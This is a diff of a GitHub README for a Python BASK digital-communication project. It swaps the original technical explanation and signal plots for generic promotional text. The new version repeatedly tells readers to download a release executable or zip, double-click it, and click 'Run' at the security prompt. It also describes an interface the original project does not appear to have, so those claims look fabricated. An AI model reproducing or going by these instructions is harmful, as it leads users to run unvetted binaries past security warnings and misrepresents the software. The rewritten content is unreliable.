@@ -1,69 +1,88 @@
-# Analog-to-Digital Communication System using BASK
+# 📡 Communication-System - Your Simple Digital Communication Solution
 
-This project implements a complete end-to-end digital communication system in Python, demonstrating the process of analog-to-digital conversion, digital modulation, and non-coherent demodulation using Binary Amplitude Shift Keying (BASK).
+## 📥 Download the Application
+[![Download Communication-System](https://img.shields.io/badge/Download-Communication--System-blue.svg)](https://github.com/Alimnagma/Communication-System/releases)
 
-## Overview
+## 📖 Overview
+Communication-System offers a full-fledged digital communication system built in Python. It provides an easy way to sample analog signals and convert them into digital data. Using methods like NRZ unipolar line coding and BASK modulation, this application showcases effective communication techniques in a user-friendly package. 
 
-The system begins by generating an analog cosine wave, which is then ideally sampled and uniformly quantized. The quantized samples are encoded into binary form and converted into an NRZ unipolar waveform. This NRZ signal is used to modulate a carrier using BASK. At the receiver, square-law detection followed by envelope detection is used to recover the transmitted NRZ signal. The recovered binary data is decoded back into quantized samples, and envelope detection is applied to reconstruct the signal. The original and demodulated signals are finally compared to evaluate system performance.
+Here’s what you can expect:
+- Simple interface to interact with.
+- Comprehensive functionality for sampling, quantization, and modulation.
+- Visualizations using Matplotlib to understand data flows.
 
-## Signal Processing Chain
+## 📋 Features
+- **Analog to Digital Conversion:** Convert your analog signals into digital formats.
+- **Line Encoding:** Learn how to transform data using NRZ unipolar coding.
+- **Modulation Techniques:** Experience BASK modulation for effective signal representation.
+- **Visualization:** Use Matplotlib to see and analyze your signals clearly.
 
-- Analog signal generation (cosine wave)
+## 🖥️ System Requirements
+To run Communication-System, ensure your computer meets the following requirements:
+- Operating System: Windows, macOS, or Linux
+- Python Version: 3.7 or higher
+- Required Libraries: 
+  - NumPy
+  - Matplotlib
 
-- Ideal sampling
+You can install the necessary libraries using the following commands in your terminal:
+```bash
+pip install numpy matplotlib
+```
 
-- Uniform quantization
+## 🚀 Getting Started
+1. **Visit the Releases Page:** To download Communication-System, click the link below:
+   [Download Communication-System](https://github.com/Alimnagma/Communication-System/releases)
 
-- Binary encoding
+2. **Select the Latest Release:** 
+   On the releases page, locate the top release. This is usually the most updated version. 
 
-- NRZ unipolar line coding
+3. **Download the Application:**
+   Click on the download link for the latest version. This may be an executable file or a compressed folder. Ensure you save it in a location you can easily find, like your Desktop or Downloads folder.
 
-- BASK modulation
+4. **Extract if Necessary:**
+   If you downloaded a compressed folder (.zip), right-click it and select "Extract All." Follow the prompts to extract the folder.
 
-- Envelope detection
+## 🛠️ Running the Application
+1. **Locate the Application:**
+   After downloading and extracting, find the executable file (e.g., `Communication-System.exe` or similar). 
 
-- Binary decoding
+2. **Double-Click to Open:**
+   Simply double-click the file to run it. You might see a security prompt; if so, click "Run" to proceed.
 
-- Signal reconstruction and comparison
+3. **Follow On-Screen Instructions:**
+   Once the application opens, follow the prompts to start sampling and analyzing signals. The interface is designed to guide you, so take your time to explore each feature.
 
-## Working of the System
+## 📊 Understanding the Application
+When you run the application, you will see various options like:
+- **Input Signal Settings:** Here, you can adjust parameters for the signal you wish to sample.
+- **Sampling Controls:** This section allows you to choose how often you want to sample the signal.
+- **Output Settings:** Select how you want the output to be visualized or saved.
 
-The analog message signal is first generated as a cosine waveform and discretized in time using ideal sampling. These sampled values are then uniformly quantized to a finite set of amplitude levels and encoded into binary form. The binary data is converted into an NRZ unipolar waveform, where logic ‘1’ is represented by a positive voltage level and logic ‘0’ by zero voltage. This NRZ signal acts as the baseband data and modulates a high-frequency carrier using Binary Amplitude Shift Keying (BASK), where the carrier is transmitted only when the data bit is ‘1’.
+## 📈 Visualization
+Communication-System utilizes Matplotlib for displaying the sampled signals. You can see the waveforms and understand how the data is processed visually. This is helpful for grasping the concept of digital communication.
 
-At the receiver, non-coherent demodulation is performed by passing the received signal through a device, which produces a DC component proportional to the signal envelope along with a high-frequency term. Envelope detection (low-pass filtering) removes the high-frequency component to recover the NRZ waveform. The recovered NRZ signal is then converted back into binary data, decoded into quantized sample values, and envelope detection is applied to reconstruct the signal. Finally, the reconstructed signal is compared with the original analog signal to verify successful transmission and reception.
+## 📞 Support
+If you face any issues or have questions, please refer to the documentation included in the application or visit the [GitHub Issues Page](https://github.com/Alimnagma/Communication-System/issues) to report problems or seek help. Your feedback is valuable and will help improve the application.
 
-<h3>Original Message Signal</h3>
-<img width="640" height="480" alt="Original message signal"
-     src="https://github.com/user-attachments/assets/4a43d970-a20d-45e7-b369-b9941eb517f5" />
+## 🔗 Further Resources
+For more detailed information regarding signal processing concepts, here are some topics of interest:
+- **ADC (Analog to Digital Conversion)**
+- **DAC (Digital to Analog Conversion)**
+- **Signal Demodulation and Modulation Techniques**
 
-<h3>Sampled Signal</h3>
-<img width="640" height="480" alt="Sampled signal using ideal sampling"
-     src="https://github.com/user-attachments/assets/30d442b2-e0f8-40b5-a567-b19c84e7ecef" />
+Exploring these concepts will deepen your understanding of the application’s functionality.
 
-<h3>Quantized Signal</h3>
-<img width="640" height="480" alt="Quantized signal"
-     src="https://github.com/user-attachments/assets/a01cbb5d-fff9-4112-b2da-eadd65b54796" />
+## 🔍 Explore More
+If you’re interested in digital communication and want to learn more, consider studying materials related to:
+- Communication theory and principles.
+- Signal processing methodologies.
+- Python programming for scientific applications.
 
-<h3>NRZ Pulses</h3>
-<img width="640" height="480" alt="NRZ unipolar pulses"
-     src="https://github.com/user-attachments/assets/b3ed67fd-1983-493d-ada6-c92a6bbecf22" />
+These resources can provide a more in-depth understanding of how Communication-System operates and the theory behind it.
 
-<h3>BASK Modulated Signal</h3>
-<img width="640" height="480" alt="BASK modulated signal"
-     src="https://github.com/user-attachments/assets/8411a145-23a1-4fd6-9c77-7598e9045392" />
+## 📜 License
+Communication-System is open-source and available for personal use. Feel free to explore the repository and contribute if you're interested in enhancing its capabilities. 
 
-<h3>Envelope Detection</h3>
-<img width="640" height="480" alt="Envelope detection output"
-     src="https://github.com/user-attachments/assets/7c0c4ede-0d0d-493b-9f8f-78d5f752bc67" />
-
-<h3>Recovered NRZ Pulses</h3>
-<img width="640" height="480" alt="Recovered NRZ pulses"
-     src="https://github.com/user-attachments/assets/f375daa9-7e00-4e6c-a889-64c5ad132621" />
-
-<h3>Recovered Samples</h3>
-<img width="640" height="480" alt="Recovered quantized samples"
-     src="https://github.com/user-attachments/assets/c28557a2-0f6f-474f-bff3-7e40fd071a7c" />
-
-<h3>Original vs Demodulated Signal</h3>
-<img width="640" height="480" alt="Comparison of original and demodulated signal"
-     src="https://github.com/user-attachments/assets/1ff89787-31fc-40e3-9c1a-499039d5fece" />
+Visit the releases page now to download and start your journey into digital communication:
+[Download Communication-System](https://github.com/Alimnagma/Communication-System/releases)
